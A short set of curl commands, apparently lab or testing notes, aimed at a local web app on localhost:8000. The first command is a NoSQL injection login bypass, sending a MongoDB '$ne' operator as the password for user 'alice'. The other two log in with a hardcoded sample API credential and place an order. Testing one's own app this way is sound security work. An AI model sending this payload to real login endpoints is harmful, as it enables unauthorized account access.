# NoSQLi (login)
curl -X POST http://localhost:8000/login_mongo -H "Content-Type: application/json" -d '{"username":"alice","password":{"$ne":"x"}}'

curl -i -s -X POST http://localhost:8000/login_mongo   -H 'Content-Type: application/json'   -d '{"username":"api_user","password":"ChangeThisApiPass!2025"}'
curl -i -s -X POST http://localhost:8000/pedidos   -u 'api_user:ChangeThisApiPass!2025'   -H 'Content-Type: application/json'   -d '{"producto":"Teclado mecánico","cantidad":1,"usuario":"api_user"}'